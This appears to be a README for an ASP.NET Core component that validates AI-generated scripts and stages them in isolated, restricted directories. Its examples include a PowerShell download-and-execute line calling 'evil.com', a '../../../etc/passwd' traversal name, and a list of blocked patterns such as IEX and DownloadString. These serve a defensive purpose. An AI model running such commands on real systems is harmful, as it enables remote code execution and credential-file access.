# Secure Staging Manager

Production-ready implementation of a secure staging environment manager for AI-generated scripts in ASP.NET Core 8.0.

## Overview

The `SecureStagingManager` provides isolated, temporary directories for executing AI-generated scripts with:
- **Strict permissions** (Linux: chmod 0700/0500/0300/0200, Windows: FileAttributes)
- **Auto-cleanup** after 1 hour expiration
- **Path traversal protection** preventing `..`, `/`, `\` in filenames
- **Dangerous pattern detection** (Invoke-Expression, eval, exec, etc.)
- **Secure file deletion** with 3-pass DoD 5220.22-M overwrite
- **SHA256 checksums** for file integrity verification
- **Cross-platform support** (Windows, Linux, macOS)

## Architecture

```
IStagingManager (Interface)
    └── SecureStagingManager (Implementation)
        ├── StagingEnvironment (Disposable container)
        └── ValidationResult (Immutable result object)
```

## Directory Structure

```
/var/agent-staging/{agentId}_{sessionId}_{timestamp}/
    ├── scripts/   (0700 → 0400 after write) - AI-generated scripts
    ├── inputs/    (0500) - Read-only input data
    ├── outputs/   (0300) - Write-only output data
    └── logs/      (0200) - Append-only execution logs
```

## Usage

### 1. Register in Dependency Injection

```csharp
// Program.cs or Startup.cs
services.AddSingleton<IStagingManager, SecureStagingManager>();
```

### 2. Create Staging Environment

```csharp
[ApiController]
[Route("api/[controller]")]
public class AgentController : ControllerBase
{
    private readonly IStagingManager _stagingManager;
    private readonly ILogger<AgentController> _logger;

    public AgentController(
        IStagingManager stagingManager,
        ILogger<AgentController> logger)
    {
        _stagingManager = stagingManager;
        _logger = logger;
    }

    [HttpPost("execute")]
    public async Task<IActionResult> ExecuteScript(
        [FromBody] ScriptExecutionRequest request,
        CancellationToken cancellationToken)
    {
        StagingEnvironment env = null;
        try
        {
            // Create isolated staging environment
            env = await _stagingManager.CreateStagingEnvironmentAsync(
                agentId: request.AgentId,
                sessionId: request.SessionId,
                cancellationToken: cancellationToken);

            _logger.LogInformation(
                "Staging environment created: {RootPath}",
                env.RootPath);

            // Validate and stage the script
            var validationResult = await _stagingManager.ValidateAndStageScriptAsync(
                environment: env,
                content: request.ScriptContent,
                name: request.ScriptName,
                cancellationToken: cancellationToken);

            if (!validationResult.IsValid)
            {
                return BadRequest(new
                {
                    errors = validationResult.Errors,
                    warnings = validationResult.Warnings
                });
            }

            _logger.LogInformation(
                "Script validated successfully. Checksum: {Checksum}, Size: {Size} bytes",
                validationResult.Checksum,
                validationResult.FileSizeBytes);

            // Execute the script (implementation specific)
            var executionResult = await ExecuteScriptInSandbox(
                validationResult.StagedFilePath,
                env.OutputsPath,
                env.LogsPath,
                cancellationToken);

            return Ok(new
            {
                checksum = validationResult.Checksum,
                warnings = validationResult.Warnings,
                result = executionResult
            });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Script execution failed");
            return StatusCode(500, new { error = ex.Message });
        }
        finally
        {
            // Auto-cleanup via Dispose (or explicit cleanup)
            env?.Dispose();

            // Or manual cleanup:
            // if (env != null)
            // {
            //     await _stagingManager.CleanupStagingEnvironmentAsync(
            //         env, cancellationToken);
            // }
        }
    }
}
```

### 3. Script Validation Examples

**Valid Script:**
```csharp
var scriptContent = @"
Get-Process | Where-Object { $_.CPU -gt 100 } |
    Select-Object Name, CPU, WorkingSet |
    Export-Csv -Path output.csv -NoTypeInformation
";

var result = await _stagingManager.ValidateAndStageScriptAsync(
    env,
    scriptContent,
    "process-monitor.ps1");

// result.IsValid == true
// result.Checksum == "a1b2c3d4..."
```

**Invalid Script (Path Traversal):**
```csharp
var result = await _stagingManager.ValidateAndStageScriptAsync(
    env,
    "...",
    "../../../etc/passwd"); // Path traversal detected

// result.IsValid == false
// result.Errors == ["Script name contains invalid characters or path traversal pattern"]
```

**Dangerous Script (Blocked):**
```csharp
var maliciousScript = @"
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
";

var result = await _stagingManager.ValidateAndStageScriptAsync(
    env,
    maliciousScript,
    "malicious.ps1");

// result.IsValid == false
// result.Errors == ["Dangerous code execution pattern detected: Invoke-Expression"]
```

## Security Features

### 1. Path Traversal Protection

Validates script names against:
- `..` (parent directory)
- `/` and `\` (path separators)
- Control characters (0x00-0x1F)
- Maximum length (255 characters)
- Allowed characters: `[a-zA-Z0-9_\-\.]`

### 2. Dangerous Pattern Detection

Detects and blocks/warns about:
- `Invoke-Expression`, `IEX`
- `Invoke-Command`, `Invoke-WebRequest`
- `Start-Process`, `New-Object System.Net.WebClient`
- `DownloadString`, `DownloadFile`
- `exec()`, `eval()`
- Base64 encoding/decoding
- `-EncodedCommand`
- `Add-Type` (C# injection)
- Destructive commands (`rm -rf`, `del /`)

### 3. Secure File Deletion (DoD 5220.22-M)

Three-pass overwrite:
1. **Pass 1**: Random data
2. **Pass 2**: Complement of random data
3. **Pass 3**: Random data again

### 4. Permission Model

| Directory | Linux Mode | Purpose |
|-----------|------------|---------|
| Root      | 0700       | Owner full access |
| scripts/  | 0700 → 0400 | Read-only after write |
| inputs/   | 0500       | Read-only |
| outputs/  | 0300       | Write-only |
| logs/     | 0200       | Append-only |

## Auto-Cleanup

- **Expiration**: 1 hour after creation
- **Periodic check**: Every 10 minutes
- **Manual cleanup**: Via `CleanupStagingEnvironmentAsync()`
- **Disposal**: Automatic via `StagingEnvironment.Dispose()`

## Cross-Platform Support

```csharp
// Automatically selects platform-specific paths:
// Linux/macOS: /var/agent-staging
// Windows:     C:\AgentStaging

var basePath = _stagingManager.GetBaseStagingPath();

// Platform-specific permissions:
// - Linux/macOS: chmod via Process.Start
// - Windows: FileAttributes (ReadOnly, Normal)
```

## Error Handling

All methods include comprehensive error handling:

```csharp
try
{
    var env = await _stagingManager.CreateStagingEnvironmentAsync(
        agentId, sessionId, cancellationToken);
}
catch (ArgumentException ex)
{
    // Invalid input parameters
}
catch (UnauthorizedAccessException ex)
{
    // Insufficient permissions
}
catch (IOException ex)
{
    // File system errors
}
catch (Exception ex)
{
    // Unexpected errors (logged automatically)
}
```

## Performance Considerations

- **Async/await**: All I/O operations are asynchronous
- **Buffered I/O**: 4KB buffer for file operations
- **Parallel-safe**: Thread-safe cleanup with `SemaphoreSlim`
- **Background cleanup**: Timer-based periodic cleanup
- **Efficient hashing**: SHA256 with buffered stream reading

## Testing

See `/backend/WAiSA.API/Security/Staging/SecureStagingManagerTests.cs` for comprehensive unit tests covering:
- Environment creation and isolation
- Script validation (valid, invalid, malicious)
- Permission settings (Linux and Windows)
- Secure deletion
- Auto-cleanup
- Edge cases and error conditions

## Dependencies

```xml
<PackageReference Include="Microsoft.Extensions.Logging.Abstractions" Version="8.0.0" />
```

Built-in .NET 8.0 types:
- `System.IO`
- `System.Security.Cryptography`
- `System.Runtime.InteropServices`
- `System.Text.RegularExpressions`

## Production Checklist

- [ ] Configure base paths in appsettings.json (optional)
- [ ] Ensure sufficient disk space for staging directories
- [ ] Set up monitoring for cleanup failures
- [ ] Configure logging levels (Information for production)
- [ ] Test permissions on target deployment platform
- [ ] Review dangerous pattern list for your use case
- [ ] Set up alerts for validation failures
- [ ] Document custom script execution logic
- [ ] Test auto-cleanup timer in production environment
- [ ] Verify file deletion compliance requirements

## License

Copyright 2024 WAiSA. All rights reserved.
